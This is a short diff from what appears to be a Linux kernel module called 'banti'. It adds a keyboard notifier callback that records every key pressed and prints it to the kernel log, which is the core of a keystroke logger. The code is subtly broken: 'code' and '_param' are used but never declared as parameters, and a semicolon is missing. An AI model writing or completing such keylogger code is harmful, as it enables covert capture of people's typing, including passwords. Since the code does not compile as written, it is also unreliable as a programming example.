@@ -182,7 +182,19 @@ char banti_handle_key(int key)
 ---------------------------------------------*/
 int banti_key_notifer() 
 {
+    /* Used variables */
+    char key;
+    struct keyboard_notifier_param *param = _param;
 
+    if (code == KBD_KEYCODE)
+    {
+        /* Get and log key */
+        key = banti_handle_key(param->value)
+        if(param->down)
+            printk(KERN_INFO "%c", key); 
+    }
+
+    return NOTIFY_OK;
 }
 
 
